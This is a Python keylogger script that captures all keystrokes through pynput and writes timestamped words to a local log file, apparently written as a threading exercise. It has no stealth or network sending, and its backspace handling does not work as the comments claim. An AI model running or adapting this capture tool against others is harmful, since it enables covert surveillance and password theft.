import queue
import threading
import time
from datetime import datetime
from pynput import keyboard

LOG_FILE = "test.log"       # file where all keystrokes are saved
key_queue = queue.Queue()   # shared bridge between threads — thread-safe by design

TIME_WINDOW     = 2.0       # seconds of idle before flushing incomplete word
FLUSH_INTERVAL  = 300       # hard flush every 5 minutes (in seconds)
MAX_BUFFER_SIZE = 50        # flush immediately when buffer reaches this many characters

# maps special key names to what they should produce
# None = backspace (special handling), '' = drop silently
KEY_ACTIONS = {
    'space':     ' ',       # produce a space character
    'enter':     '\n',      # produce a newline — triggers line flush
    'tab':       '\t',      # produce a tab character
    'backspace': None,      # remove last character from buffer
    'shift':     '',        # drop — character already reflects shift
    'shift_r':   '',
    'ctrl':      '',        # drop — control keys produce no visible character
    'ctrl_r':    '',
    'alt':       '',
    'alt_l':     '',
    'alt_r':     '',
    'caps_lock': '',
    'up':        '',        # drop — navigation keys produce no character
    'down':      '',
    'left':      '',
    'right':     '',
    'home':      '',
    'end':       '',
}

WORD_TRIGGERS = {' ', '\t', '.', ',', '!', '?'}    # these characters end a word
LINE_TRIGGER  = '\n'                                # this character ends a line


def on_press(key):
    # runs on Thread 1 (pynput's listener thread)
    # only job is to put keystrokes in the queue — never touches the file
    try:
        # key.char exists for printable characters (a, b, 1, !, etc.)
        key_queue.put(('CHAR', key.char, time.time()))
    except AttributeError:
        # key.char doesn't exist for special keys — extract the name instead
        key_name = str(key).replace('Key.', '')     # 'Key.shift' → 'shift'
        action = KEY_ACTIONS.get(key_name, None)    # look up what to do with it
        if action is not None and action != '':     # skip None (backspace) and '' (drop)
            key_queue.put(('CHAR', action, time.time()))


def interval_trigger(q):
    # runs on Thread 3 — completely independent of typing activity
    # sleeps for exactly 5 minutes then sends a flush signal through the queue
    while True:
        time.sleep(FLUSH_INTERVAL)                      # block for 5 minutes
        q.put(('INTERVAL', None, time.time()))          # wake up writer and tell it to flush


def flush(buffer, f, suffix=''):
    # helper — writes buffer contents to file then clears the buffer
    # suffix tags the entry so we know why it was flushed
    word = ''.join(buffer).strip()      # join all chars into one string, remove whitespace
    if word:                            # only write if there's something to write
        timestamp = datetime.now().strftime("%H:%M:%S.%f")     # current time with microseconds
        f.write(f"[{timestamp}] {word}{suffix}\n")             # write timestamped entry
        f.flush()                       # force write to disk immediately, don't wait for OS
    buffer.clear()                      # empty the buffer regardless of whether anything was written


def writer(q):
    # runs on Thread 2 — owns the buffer and file handle exclusively
    # nothing else touches these directly
    buffer = []                         # accumulates characters between flushes
    last_received = time.time()         # tracks when the last keypress arrived

    with open(LOG_FILE, "a", encoding='utf-8') as f:   # open once, keep open for the session
        while True:
            try:
                # wait up to 0.1s for an item — short timeout so idle check stays responsive
                kind, value, ts = q.get(timeout=0.1)
                last_received = ts      # update last keypress time

                if kind == 'INTERVAL':              # signal from interval thread
                    flush(buffer, f, ' [interval]') # hard flush regardless of buffer state

                elif value is None:                 # poison pill — program is shutting down
                    flush(buffer, f, ' [shutdown]') # flush whatever is left
                    break                           # exit the loop, thread ends cleanly

                elif value == LINE_TRIGGER:         # enter was pressed
                    flush(buffer, f, ' [newline]')  # flush and mark as newline

                elif value in WORD_TRIGGERS:        # space or punctuation
                    flush(buffer, f)                # flush as a complete word, no tag

                else:
                    buffer.append(value)            # regular character — add to buffer

                    if len(buffer) >= MAX_BUFFER_SIZE:          # buffer too large
                        flush(buffer, f, ' [size]')             # flush immediately

            except queue.Empty:
                # nothing arrived in the last 0.1s — check if idle time has been exceeded
                if buffer and (time.time() - last_received) >= TIME_WINDOW:
                    flush(buffer, f, ' [timeout]')  # flush stale buffer


def main():
    # create and start the writer thread
    # daemon=True means it dies automatically when the main thread exits
    t_writer = threading.Thread(target=writer, args=(key_queue,), daemon=True)
    t_writer.start()

    # create and start the interval thread
    # also daemon so it dies on exit without needing explicit cleanup
    t_interval = threading.Thread(target=interval_trigger, args=(key_queue,), daemon=True)
    t_interval.start()

    # start the keyboard listener — this creates Thread 1 internally
    # listener.join() blocks main thread here until Ctrl+C or listener stops
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # send poison pill to tell writer thread to flush remaining buffer and stop
    key_queue.put(('CHAR', None, time.time()))
    t_writer.join()     # wait for writer to finish cleanly before exiting
    # t_interval does not need joining — daemon=True handles cleanup


if __name__ == "__main__":
    main()